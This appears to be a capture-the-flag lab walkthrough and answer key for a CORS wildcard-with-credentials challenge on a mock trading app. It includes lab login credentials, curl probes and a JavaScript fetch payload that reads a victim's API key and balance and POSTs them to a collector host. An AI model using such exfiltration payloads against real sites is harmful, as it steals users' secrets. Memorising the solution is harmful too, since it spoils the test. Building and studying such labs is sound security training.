# CORS — WildcardCreds · Stockleap (difficulty: low · CUT CANDIDATE)

`GET /api/secret` (login required) returns `{username, api_key, balance, positions}` and answers **every** request with `Access-Control-Allow-Origin: *` together with `Access-Control-Allow-Credentials: true`. **Educational only:** real browsers reject credentialed responses carrying a wildcard ACAO — `fetch(..., {credentials:'include'})` fails the CORS check — which is why this subclass is marked `cut_candidate` in the manifest (architecture-decisions §7.3). The combination is still a genuine misconfiguration signal (broken CORS layer; non-browser clients and naive proxies may honour it), and the lab's victim-bot model lets `/verify` demonstrate the full data flow.

Intended path:
1. Log in at http://victim.target.lab:8119/ as `0xnhsec` / `vlh-tester-01`.
2. Confirm the headers: `curl -si -b "sid=<sid>" -H "Origin: http://attacker.target.lab:8119" http://victim.target.lab:8119/api/secret` → `Access-Control-Allow-Origin: *` + `Access-Control-Allow-Credentials: true` (note: a real browser refuses this combo on credentialed reads).
3. Store the would-be artifact on the exploit server: `fetch('http://victim.target.lab:8119/api/secret',{credentials:'include'}).then(r=>r.text()).then(d=>fetch('http://collector.target.lab:8119/collect',{method:'POST',body:d}))`.
4. Trigger the bot (it models the SOP-permitted read the ACAO layer claims to grant): `curl -X POST http://collector.target.lab:8119/victim -H 'Content-Type: application/json' -d '{"url":"http://victim.target.lab:8119/api/secret","origin":"http://attacker.target.lab:8119"}'`
5. `curl http://collector.target.lab:8119/verify` → flag.

Flag: `DSLTV{CORS-WildcardCreds-<9-10 digits>}` (event-verified — minted by the verifier, regenerated every restart).
